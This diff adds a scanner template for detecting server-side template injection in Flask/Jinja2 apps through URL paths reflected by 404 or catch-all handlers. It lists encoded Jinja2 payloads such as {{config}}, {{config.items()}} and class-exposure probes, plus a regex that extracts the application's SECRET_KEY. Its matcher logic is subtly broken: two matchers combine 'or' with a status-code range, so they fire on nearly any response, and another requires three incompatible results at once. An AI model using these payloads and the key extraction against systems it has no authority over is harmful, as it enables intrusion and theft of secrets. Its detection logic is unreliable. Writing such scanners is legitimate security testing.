@@ -1,0 +1,200 @@
+id: path-ssti
+
+info:
+  name: Path-based SSTI Detection (404 Handler / Catch-All Routes)
+  author: custom
+  severity: critical
+  description: Detects Server-Side Template Injection (SSTI) in URL path parameters, commonly found in custom 404 error handlers or catch-all routes that reflect the requested path
+  tags: ssti,path,flask,jinja2,rce,custom
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+variables:
+  random: "{{7}}"
+
+http:
+  - raw:
+      # Basic math evaluation
+      - |
+        GET /%7B%7B7*7%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7B7*'7'%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7B49%2B49%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      # Flask/Jinja2 objects
+      - |
+        GET /%7B%7Bconfig%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Bself%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Bdict%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Bg%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Brequest%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Bsession%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      # Class exposure
+      - |
+        GET /%7B%7B''.__class__%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Bconfig.__class__%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%7B%7Brequest.application%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      # Config items
+      - |
+        GET /%7B%7Bconfig.items()%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      # Double URL encoded
+      - |
+        GET /%257B%257B7*7%257D%257D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%257B%257Bconfig%257D%257D HTTP/1.1
+        Host: {{Hostname}}
+
+      # With path prefix
+      - |
+        GET /test/%7B%7B7*7%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /test/%7B%7Bconfig%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /notfound/%7B%7B7*7%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /notfound/%7B%7Bconfig%7D%7D HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: ssti-math-evaluation
+        dsl:
+          - 'contains(body, "49")'
+          - 'contains(body, "7777777")'
+          - 'contains(body, "98")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+      - type: dsl
+        name: ssti-flask-config
+        dsl:
+          - 'contains(body, "SECRET_KEY")'
+          - 'contains(body, "DEBUG")'
+          - 'contains(body, "TESTING")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+      - type: dsl
+        name: ssti-class-exposure
+        dsl:
+          - 'contains(body, "<class")'
+          - 'contains(body, "str")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: or
+
+      - type: dsl
+        name: ssti-dict-class
+        dsl:
+          - 'contains(body, "<class")'
+          - 'contains(body, "dict")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+      - type: dsl
+        name: ssti-flask-objects
+        dsl:
+          - 'contains(body, "<flask")'
+          - 'contains(body, "<Request")'
+          - 'contains(body, "<LocalProxy")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: or
+
+      - type: dsl
+        name: ssti-config-items
+        dsl:
+          - 'contains(body, "dict_items")'
+          - 'contains(body, "SECRET")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+      - type: dsl
+        name: ssti-request-object
+        dsl:
+          - 'contains(body, "environ")'
+          - 'contains(body, "werkzeug")'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+      - type: dsl
+        name: ssti-404-page-reflection
+        dsl:
+          - 'contains(body, "404")'
+          - 'contains(body, "Not Found")'
+          - 'regex("<class|dict_items|<flask|SECRET_KEY", body)'
+          - 'status_code == 404'
+        condition: and
+
+      - type: word
+        name: ssti-config-values
+        part: body
+        words:
+          - "PERMANENT_SESSION_LIFETIME"
+          - "APPLICATION_ROOT"
+          - "SESSION_COOKIE_NAME"
+          - "MAX_CONTENT_LENGTH"
+
+    extractors:
+      - type: regex
+        name: ssti-math-result
+        part: body
+        regex:
+          - "404[^<]*: (49|7777777|98) Not Found"
+          - "<h1>404 : (49|7777777|98) Not Found</h1>"
+
+      - type: regex
+        name: ssti-config-extraction
+        part: body
+        regex:
+          - "SECRET_KEY['\"]?: ['\"]?([^'\"<>]+)"
+          - "404[^<]*: <Config [^>]+>"
+
+      - type: regex
+        name: ssti-class-extraction
+        part: body
+        regex:
+          - "404[^<]*: (<class '[^']*'>) Not Found"
+          - "<h1>404 : (<class '[^']*'>) Not Found</h1>"
